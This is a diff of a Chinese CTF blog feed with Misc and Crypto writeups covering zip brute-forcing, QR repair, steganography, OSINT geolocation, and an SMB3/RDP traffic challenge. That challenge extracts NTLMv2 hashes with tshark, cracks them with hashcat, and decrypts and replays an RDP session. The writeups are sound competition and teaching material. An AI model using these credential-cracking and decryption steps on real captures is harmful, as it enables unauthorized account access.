+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105612311.png"
+                        alt="image-20241020105612311"
+                 ></p>
+<p>提示md5(花费阳光)是解压密码</p>
+<p>我是猜不到了，，写个脚本开爆</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_md5</span>(<span class="params">number</span>):</span><br><span class="line"></span><br><span class="line">    md5_hash = hashlib.md5(<span class="built_in">str</span>(number).encode()).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> md5_hash</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;md5_hashes.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10001</span>):</span><br><span class="line"></span><br><span class="line">        md5_value = generate_md5(i)</span><br><span class="line"></span><br><span class="line">        f.write(<span class="string">f&#x27;<span class="subst">&#123;md5_value&#125;</span>\n&#x27;</span>)  </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;已写入md5_hashes.txt&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105840067.png"
+                        alt="image-20241020105840067"
+                 ></p>
+<p>二维码修复（最害怕的一集）</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105852465.png"
+                        alt="image-20241020105852465"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105904760.png"
+                        alt="image-20241020105904760"
+                 ></p>
+<p>仔细观察左下角，应该不是定位块，猜测二维码被偏移+旋转，修复后得到密文</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105918057.png"
+                        alt="image-20241020105918057"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105927470.png"
+                        alt="image-20241020105927470"
+                 ></p>
+<blockquote>
+<p>[YG{VDTveRc10qpnJ+<em>)G!~f1{d@-}v&lt;)9xqYonsrqj0hPlkdcb(<code>Hd]#a</code>_A@VzZY;Qu8NMqKPONGkK-,BGF?cCBA@&quot;&gt;76Z:321U54-21</em>Non,+*#G’&amp;%d"y?w_uzsr8vunVrk1ongOe+ihgfeG]#[ZY^W\UZSwWVUNrRQ3IHGLEiCBAFE>=aA:9>765:981Uvu-2+O/.nm+Hi’~}|B&quot;!~}|u]s9qYonsrqj0hmlkjc)gIedcb[!YX]\UZSwWVUN6LpP2HMFEDhHG@dDCBA:^!~&lt;;:921U/u3,+<em>Non&amp;%</em>)('&amp;}C{cy?}|{zs[q7unVl2ponmleMib(fHG]b[Z~k</p>
+</blockquote>
+<p>这个时候回头去看图片的名字：M41b0lg3.png</p>
+<p>把M41b0lg3转换为malbolge，上网一搜发现是一种编程语言，直接在线网站运行即可得到flag</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105949204.png"
+                        alt="image-20241020105949204"
+                 ></p>
+<h3 id="Find-way-to-read-video">Find way to read video</h3>
+<p>社工题，每个队伍得到的用户名不一样，所以flag也不一样，综合了几个队伍得到用户名形式是：五个英文+四个数字</p>
+<p>附件解压出来的TXT就以下内容：</p>
+<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">bonan7654 has put his email template on a public platform.</span><br></pre></td></tr></table></figure>
+<p>结果最终在GitCode上，社了一下午+一晚上，，结果这屎题在这种屎平台上</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020112816702.png"
+                        alt="image-20241020112816702"
+                 ></p>
+<p>然后根据<code>垃圾邮箱隐写</code>一类的提示，找到<code>spam</code></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020112915512.png"
+                        alt="image-20241020112915512"
+                 ></p>
+<p>联想到<code>spammimic</code>隐写，直接在线网站：</p>
+<p><a class="link"   href="https://www.spammimic.com/decode.cgi" >https://www.spammimic.com/decode.cgi<i class="fas fa-external-link-alt"></i></a></p>
+]]></content>
+      <categories>
+        <category>题解</category>
+      </categories>
+      <tags>
+        <tag>Misc</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>2024 CISCN x 长城杯铁人三项 Misc方向 部分WriteUp</title>
     <url>//post/2024ciscnccb/</url>
     <content><![CDATA[<p>先吐槽：应急响应狠狠做爽了，一个人、八小时、19道应急响应+取证，隔壁浙警5分钟两个一血，火眼一把梭，没有火眼的我都要做吐了。。还有那个逆天《时间线关联非常重要》，翻了两个小时流量最后几分钟死马当活马医试出来了。逆天</p>
@@ -193,401 +694,6 @@
       </tags>
   </entry>
   <entry>
-    <title>2024 睿抗 Misc方向 全WriteUp</title>
-    <url>//post/2024Raicom/</url>
-    <content><![CDATA[<p><s>全国睿抗机器人大赛-网络安全方向</s> 黑盒原题赛 Misc方向全WP</p>
-<p>锐评：排名是看不到的，题目是奇安信杯的，flag是不改的，非预期是可以秒的，拿血是看手速的（为什么Lunatic又比我快一秒，我的二血啊啊啊）</p>
-<h3 id="你是黑客么">你是黑客么</h3>
-<p>打开压缩包发现有密码，纯数字爆破得到密码</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241019130216341.png"
-                        alt="image-20241019130216341"
-                 ></p>
-<p>010打开发现一个PK头</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241019130408645.png"
-                        alt="image-20241019130408645"
-                 ></p>
-<p>复制到CyberChef中解base64，然后是一张png文件</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241019130533925.png"
-                        alt="image-20241019130533925"
-                 ></p>
-<p>扫码得到flag</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241019130633439.png"
-                        alt="image-20241019130633439"
-                 ></p>
-<p><code>flag&#123;asdf%^&amp;*ghjkl&#125;</code></p>
-<h3 id="循环的压缩包">循环的压缩包</h3>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;tarfile&quot;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">        </span><br><span class="line">    zip_data = data[<span class="number">512</span>:]</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;new.zip&quot;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.write(zip_data)</span><br><span class="line">        </span><br><span class="line">    os.mkdir(<span class="string">&quot;tmp&quot;</span>)</span><br><span class="line">    archive_file = <span class="string">&quot;new.zip&quot;</span></span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(archive_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zip_ref:</span><br><span class="line">        zip_ref.extractall(path=<span class="string">&quot;tmp/&quot;</span>)</span><br><span class="line">        os.system(<span class="string">&quot;mv tmp/* .&quot;</span>)</span><br><span class="line">        os.rmdir(<span class="string">&quot;tmp&quot;</span>)</span><br></pre></td></tr></table></figure>
-<p>写个脚本，flag直接出<code>flag&#123;01af9cbb-6bf2-4ad8-8ecb-9dcbbc02bf19&#125;</code></p>
-<h3 id="Goodtime">Goodtime</h3>
-<p>打开压缩包发现有密码，纯小写字母爆破得到密码<code>city</code></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241019132740995.png"
-                        alt="image-20241019132740995"
-                 ></p>
-<p>解压后发现有一大堆TXT文件</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241019132826320.png"
-                        alt="image-20241019132826320"
-                 ></p>
-<p>发现qwsz.txt有一个03 04 14 00，补上文件头后，猜测所有文件合并起来是一个压缩包，然后就是要确定文件顺序</p>
-<p>看到键盘上<code>qwsz</code>四个按键包围了A，同理<code>vghn</code>包围了B，猜测一共七个对应A-G，确定文件顺序后cyberchef提取压缩包，获得一张<code>owl.png</code>图片</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241019133049430.png"
-                        alt="image-20241019133049430"
-                 ></p>
-<p>快进到得到flag</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241019133115344.png"
-                        alt="image-20241019133115344"
-                 ></p>
-<blockquote>
-<p>非预期：给qwsz.txt补上50 4B后直接CyberChef导出，使用BandZip解压，虽然会报错，但是依然可以忽略报错正常的拿出owl.png，然后正常LSB即可，因为隐写的数据比较少，集中在前面一部分，所以直接LSB也可以解出</p>
-</blockquote>
-<h3 id="Crypto-变异凯撒">Crypto - 变异凯撒</h3>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">115!111!111!155!1!515!1511!151511!15555!11555!15555!5515!15555!5515!15555!55551!11555!</span><br><span class="line">55551!11555!55111!11555!11115!55111!51111!55555!5515!15555!5515!15555!11111!11555!5555</span><br><span class="line">1!55551!1555!55555!11155!55555!1555!15555!11155!55555!55555!15555!55555!15555!55555!55</span><br><span class="line">555!11111!15555!15555!55555!11111!55555!51111!55551!5!15555!11111!55555!55551!55555!11</span><br><span class="line">115!55555!11555!15555!55555</span><br></pre></td></tr></table></figure>
-<p>将<code>1</code>替换为<code>-</code>， <code>5</code>替换为<code>.</code>，<code>!</code>替换为(空格) ，然后<code>Morse Code</code></p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">GOODTRY!676F6F64747279215F6F60744B585B68556565506650514E6054595765</span><br></pre></td></tr></table></figure>
-<p>后面那串拿去16进制转字符串</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">_o`tKX[hUeePfPQN`TYWe</span><br></pre></td></tr></table></figure>
-<p>随波逐流一把梭<img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241019133420247.png"
-                        alt="image-20241019133420247"
-                 ></p>
-]]></content>
-      <categories>
-        <category>题解</category>
-      </categories>
-      <tags>
-        <tag>Misc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>2024 强网杯初赛 Misc方向 部分WriteUp</title>
-    <url>//post/2024qwb/</url>
-    <content><![CDATA[<h3 id="givemesecret">givemesecret</h3>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/c8c2231ec4b2b987ee88aabff280a0eb.png"
-                        alt="c8c2231ec4b2b987ee88aabff280a0eb"
-                 ></p>
-<h3 id="Master-Of-OSINT">Master Of OSINT</h3>
-<p>图1：看上去像是西北方，应该在内蒙新疆青海一带，最远处有一篇湖，百度地图一个个找过去最终在找到地点：</p>
-<p><code>青海省海南藏族自治州共和县倒湖茶公路</code></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://oss.carbo.ink/2024qiangwang/misc-1.png"
-                        alt="misc-1"
-                 ></p>
-<p>图2：根据图片最右侧的建筑，有一个明显的百安居，根据这个建筑入手找到<code>上海浦东新区 百安居(龙阳店)</code></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://oss.carbo.ink/2024qiangwang/misc-2.png"
-                        alt="misc-2"
-                 ></p>
-<p>图4：根据图中卡车所属公司<code>浙通物流</code>，位于杭州萧山，加上我经常去杭州感觉这个隔音栏就像杭州绕城高速 <code>优美爱有限公司附近</code></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://oss.carbo.ink/2024qiangwang/misc-3.png"
-                        alt="misc-3"
-                 ></p>
-<p>图5：根据建筑立体和蓝白色围栏初步判定在重庆 <code>重庆市九龙坡区谢家湾立交桥</code></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://oss.carbo.ink/2024qiangwang/misc-4.png"
-                        alt="misc-4"
-                 ></p>
-<p>图6：根据建筑密度和风格判定在东南方大城市，远处有一个类似H形的建筑 <code>南京聚宝楼招待所</code> 附近</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://oss.carbo.ink/2024qiangwang/misc-5.png"
-                        alt="misc-5"
-                 ></p>
-<p>图7：初步判定大城市，有河，远处有一栋特征明显建筑 <code>湖南省长沙市岳麓区五一大道橘子洲大桥</code></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://oss.carbo.ink/2024qiangwang/misc-6.png"
-                        alt="misc-6"
-                 ></p>
-<p>图8：应该是海，但是颜色不蓝，可能是入海口的地方，有风车 <code>上海市崇明区G40(沪陕高速)</code></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://oss.carbo.ink/2024qiangwang/misc-7.png"
-                        alt="misc-7"
-                 ></p>
-<p>图9：根据吊桥顶部形状，根据谷歌识图找到这篇文章<a class="link"   href="https://www.gov.cn/jrzg/2009-12/26/content_1497241.htm" >https://www.gov.cn/jrzg/2009-12/26/content_1497241.htm<i class="fas fa-external-link-alt"></i></a> 确定位置：<code>湖北省武汉市青山区武汉天兴洲长江大桥</code></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://oss.carbo.ink/2024qiangwang/misc-8.png"
-                        alt="misc-8"
-                 ></p>
-<p>图10：根据立交桥一行字<code>中铁三局集团解说促进浙江经济发展</code>，识图找到<code>新塘高铁公园</code></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://oss.carbo.ink/2024qiangwang/misc-9.png"
-                        alt="misc-9"
-                 ></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://oss.carbo.ink/2024qiangwang/misc-10.png"
-                        alt="misc-10"
-                 ></p>
-<h3 id="谍影重重5-0">谍影重重5.0</h3>
-<p>在协议分级中可以初步判断一下流量的种类</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241106154448407.png"
-                        alt="image-20241106154448407"
-                 ></p>
-<p>可以看到有很多加密后的SMB3流量，可以根据这篇博客<a class="link"   href="https://blog.csdn.net/qq_30464257/article/details/142205308" >SMB流量分析<i class="fas fa-external-link-alt"></i></a>了解SMB流量协议的组成，在<code>Frame 122</code>中找到<code>NTLM的Hash</code>，也找到很多RDP流量</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241106155124903.png"
-                        alt="image-20241106155124903"
-                 ></p>
-<p>根据这篇文章：</p>
-<p><a class="link"   href="https://malwarelab.eu/posts/tryhackme-smb-decryption/#smb-traffic-decryption-with-the-password" >https://malwarelab.eu/posts/tryhackme-smb-decryption/#smb-traffic-decryption-with-the-password<i class="fas fa-external-link-alt"></i></a></p>
-<p>使用tshark导出</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tshark -n -r 谍影重重5.0.pcapng -Y &#x27;ntlmssp.messagetype == 0x00000003&#x27; -T fields -e ntlmssp.auth.username -e ntlmssp.auth.domain -e ntlmssp.ntlmv2_response.ntproofstr -e ntlmssp.auth.sesskey -e smb2.sesid</span><br></pre></td></tr></table></figure>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241106160039118.png"
-                        alt="image-20241106160039118"
-                 ></p>
-<p>手动修改为hashcat支持的格式<code>tom::.:c1dec53240124487:ca32f9b5b48c04ccfa96f35213d63d75:010100000000000040d0731fb92adb01221434d6e24970170000000002001e004400450053004b0054004f0050002d004a0030004500450039004d00520001001e004400450053004b0054004f0050002d004a0030004500450039004d00520004001e004400450053004b0054004f0050002d004a0030004500450039004d00520003001e004400450053004b0054004f0050002d004a0030004500450039004d0052000700080040d0731fb92adb0106000400020000000800300030000000000000000100000000200000bd69d88e01f6425e6c1d7f796d55f11bd4bdcb27c845c6ebfac35b8a3acc42c20a001000000000000000000000000000000000000900260063006900660073002f003100370032002e00310036002e003100300035002e003100320039000000000000000000</code></p>
-<p>写入<code>hash.txt</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;tom::.:c1dec53240124487:ca32f9b5b48c04ccfa96f35213d63d75:010100000000000040d0731fb92adb01221434d6e24970170000000002001e004400450053004b0054004f0050002d004a0030004500450039004d00520001001e004400450053004b0054004f0050002d004a0030004500450039004d00520004001e004400450053004b0054004f0050002d004a0030004500450039004d00520003001e004400450053004b0054004f0050002d004a0030004500450039004d0052000700080040d0731fb92adb0106000400020000000800300030000000000000000100000000200000bd69d88e01f6425e6c1d7f796d55f11bd4bdcb27c845c6ebfac35b8a3acc42c20a001000000000000000000000000000000000000900260063006900660073002f003100370032002e00310036002e003100300035002e003100320039000000000000000000&quot;</span> &gt; hash.txt</span><br></pre></td></tr></table></figure>
-<p>然后使用hashcat进行爆破</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 5600 hash.txt rockyou.txt --show</span><br></pre></td></tr></table></figure>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241106160642565.png"
-                        alt="image-20241106160642565"
-                 ></p>
-<p>获得密码<code>babygirl233</code>，在Wireshark中，编辑 -&gt; 首选项 -&gt; Protocols -&gt; NTLMSSP输入password，即可解密SMB3的加密流量</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241106161029399.png"
-                        alt="image-20241106161029399"
-                 ></p>
-<p>导出SMB对象可以获得一个<code>flag.7z</code>文件和证书文件<img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241106161114873.png"
-                        alt="image-20241106161114873"
-                 ></p>
-<p>这个是本地RDP证书，需要将证书进行解密</p>
-<blockquote>
-<p><a class="link"   href="https://github.com/GoSecure/pyrdp/tree/main/docs" >https://github.com/GoSecure/pyrdp/tree/main/docs<i class="fas fa-external-link-alt"></i></a><br>
-<a class="link"   href="https://www.haxor.no/en/article/analyzing-captured-rdp-sessions" >https://www.haxor.no/en/article/analyzing-captured-rdp-sessions<i class="fas fa-external-link-alt"></i></a></p>
-</blockquote>
-<p>猜测证书是使用猕猴桃导出的（猕猴桃导出的默认密码是<code>mimikatz</code>）使用该密码解密TLS成功，解密后进行PDU导出，过滤器选择<code>OSI Layer 7</code>，导出后选择<code>.pcap文件</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pyrdp-convert -o output 1.pcap</span><br></pre></td></tr></table></figure>
-<p>转换为pyrdp可读的文件，然后加载<code>pyrdp-player</code>，提取pyrdp文件</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&lt;Return pressed&gt;</span><br><span class="line">&lt;Return released&gt;the</span><br><span class="line">&lt;Shift pressed&gt;</span><br><span class="line">&lt;Shift released&gt;</span><br><span class="line">&lt;Space pressed&gt;</span><br><span class="line">&lt;Space released&gt;7z</span><br><span class="line">&lt;Space pressed&gt;</span><br><span class="line">&lt;Space released&gt;password</span><br><span class="line">&lt;Space pressed&gt;</span><br><span class="line">&lt;Space released&gt;is</span><br><span class="line">&lt;Space pressed&gt;</span><br><span class="line">&lt;Space released&gt;f&#x27;</span><br><span class="line">&lt;Shift pressed&gt;&#123;</span><br><span class="line">&lt;Shift released&gt;windows</span><br><span class="line">&lt;Shift pressed&gt;_</span><br><span class="line">&lt;Shift released&gt;password</span><br><span class="line">&lt;Shift pressed&gt;&#125;</span><br><span class="line">&lt;Shift released&gt;9347013182&#x27;</span><br><span class="line">&lt;Control pressed&gt;s</span><br><span class="line">&lt;Control released&gt;</span><br><span class="line"></span><br><span class="line"># the 7z password is f&#x27;&#123;windows_password&#125;9347013182&#x27;</span><br></pre></td></tr></table></figure>
-<p>得到解压密码是<code>babygirl2339347013182</code></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241106162323513.png"
-                        alt="image-20241106162323513"
-                 ></p>
-]]></content>
-      <categories>
-        <category>题解</category>
-      </categories>
-      <tags>
-        <tag>Misc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>2024 古剑山 Misc Crypto方向 部分WriteUp</title>
-    <url>//post/2024gjs/</url>
-    <content><![CDATA[<p>先吐槽：Misc和Crypto两个方向真是抽象到我无语得想笑。早上9.02睡眼惺忪爬起来看题，结果吃了三个小时史导致我中饭都吃不下。</p>
-<h2 id="Misc">Misc</h2>
-<h3 id="蓝书包">蓝书包</h3>
-<p>解压后发现182个加密压缩包，尝试爆破解压密码，发现1.zip对应密码是10001，2.zip密码是10002，以此类推到10182。</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130181556773.png"
-                        alt="image-20241130181556773"
-                 ></p>
-<p>根据此特点写脚本：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line">output_dir = <span class="string">&quot;./output&quot;</span></span><br><span class="line">os.makedirs(output_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">183</span>):</span><br><span class="line">    zip_filename = <span class="string">f&quot;<span class="subst">&#123;i&#125;</span>.zip&quot;</span></span><br><span class="line">    password = <span class="built_in">str</span>(<span class="number">10000</span> + i).encode()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> zipfile.ZipFile(zip_filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zip_file:</span><br><span class="line">            zip_file.extractall(path=output_dir, pwd=password)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;成功解压: <span class="subst">&#123;zip_filename&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;解压失败: <span class="subst">&#123;zip_filename&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130181828909.png"
-                        alt="image-20241130181828909"
-                 ></p>
-<p>完成解压后可以在output目录下看到有saa-szz182个文件，看到saa有png文件头。</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130181914061.png"
-                        alt="image-20241130181914061"
-                 ></p>
-<p>修改saa为saa.png打开查看发现是很小一张图片，而且缺少文件尾</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130182022106.png"
-                        alt="image-20241130182022106"
-                 ></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130182044355.png"
-                        alt="image-20241130182044355"
-                 ></p>
-<p>猜测是将所有文件拼接后得到完整的图片，于是写脚本进行拼接</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_file_list</span>():</span><br><span class="line">    file_list = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> first <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;s&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;t&#x27;</span>)):</span><br><span class="line">        <span class="keyword">for</span> second <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>) + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> third <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>) + <span class="number">1</span>):</span><br><span class="line">                file_name = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">chr</span>(first)&#125;</span><span class="subst">&#123;<span class="built_in">chr</span>(second)&#125;</span><span class="subst">&#123;<span class="built_in">chr</span>(third)&#125;</span>&quot;</span></span><br><span class="line">                file_list.append(file_name)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(file_list) == <span class="number">182</span>:</span><br><span class="line">                    <span class="keyword">return</span> file_list</span><br><span class="line"></span><br><span class="line">output_file = <span class="string">&quot;output.png&quot;</span></span><br><span class="line">file_list = generate_file_list()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> outfile:</span><br><span class="line">    <span class="keyword">for</span> file_name <span class="keyword">in</span> file_list:</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(file_name):</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file_name, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> infile:</span><br><span class="line">                outfile.write(infile.read())</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;拼接文件: <span class="subst">&#123;file_name&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;文件未找到: <span class="subst">&#123;file_name&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;合成完成，输出文件为: <span class="subst">&#123;output_file&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130182236635.png"
-                        alt="image-20241130182236635"
-                 ></p>
-<p>根据题目名“蓝书包”提示为LSB，使用zsteg和stegsolve后无果，寻找cloacked-pixel的key后无果，尝试爆破cloacked-pixel的密钥，得到密钥为<code>654321</code>，解得flag</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130182458310.png"
-                        alt="image-20241130182458310"
-                 ></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130182522787.png"
-                        alt="image-20241130182522787"
-                 ></p>
-<p><code>flag&#123;8719e663c0507cecbff2db103a7f7cd7&#125;</code></p>
-<h3 id="jpg">jpg</h3>
-<p>解压后开局一张图，010查看发现文件末尾有PK头隐写zip文件，使用foremost进行提取</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130182921007.png"
-                        alt="image-20241130182921007"
-                 ></p>
-<p>发现文件加密，010查看发现flag.pdf为伪加密，修改加密位后解压得到flag.pdf</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130183258118.png"
-                        alt="image-20241130183258118"
-                 ></p>
-<p>尝试复制pdf中的文本后可以得到提示无法选中文本<img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130183324326.png"
-                        alt="image-20241130183324326"
-                 ></p>
-<p>可以借此猜测该pdf是图片一类的东西导出的，使用Photoshop打开发现存在多个图层</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241130183449139.png"
-                        alt="image-20241130183449139"
-                 ></p>
-<p>扫码得到一串长度为128的字符</p>
-<p><img  
-                       lazyload
-                       alt="image"
